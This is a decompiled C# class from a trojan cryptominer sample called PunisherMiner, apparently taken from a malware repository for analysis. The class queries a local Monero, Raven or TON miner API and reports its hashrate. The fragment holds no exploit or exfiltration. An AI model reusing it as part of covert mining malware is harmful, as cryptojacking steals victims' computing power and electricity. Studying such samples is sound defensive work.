// Decompiled with JetBrains decompiler
// Type: MApi
// Assembly: PunisherMiner, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5E38855F-8014-4FAB-90F8-2AFCCACBC0F6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Tasker.gen-a984daf88ca5b95be07c38888abaac8d0f4241cc67b3fc5e8e798a5fed89bc6d.exe

using System.IO;
using System.Net;

internal class MApi
{
  public static string GetHashrate()
  {
    string requestUriString = "";
    try
    {
      string text = "";
      string info = Program.GetInfo("CryptoType");
      if (!(info == "MONERO"))
      {
        if (!(info == "RAVE"))
        {
          if (info == "TON")
            requestUriString = "http://localhost:8080/";
        }
        else
          requestUriString = "http://localhost:9999/1/summary";
      }
      else
        requestUriString = "http://localhost:9999/1/summary";
      using (HttpWebResponse response = (HttpWebResponse) WebRequest.Create(requestUriString).GetResponse())
      {
        using (Stream responseStream = response.GetResponseStream())
        {
          using (StreamReader streamReader = new StreamReader(responseStream))
            text = streamReader.ReadToEnd();
        }
      }
      string hashrate = "";
      if (Program.GetInfo("CryptoType") == "MONERO" || Program.GetInfo("CryptoType") == "RAVE")
      {
        JsonValue jsonValue = JsonValue.Parse(text);
        jsonValue = jsonValue["hashrate"];
        jsonValue = jsonValue["highest"];
        hashrate = jsonValue.AsInteger.ToString() + " H/s";
      }
      else if (Program.GetInfo("CryptoType") == "TON")
      {
        JsonValue jsonValue = JsonValue.Parse(text);
        jsonValue = jsonValue[0];
        jsonValue = jsonValue["hashrate"];
        hashrate = (jsonValue.AsInteger / 1000000).ToString() + " H/s";
      }
      return hashrate;
    }
    catch
    {
      return "Unkown";
    }
  }
}
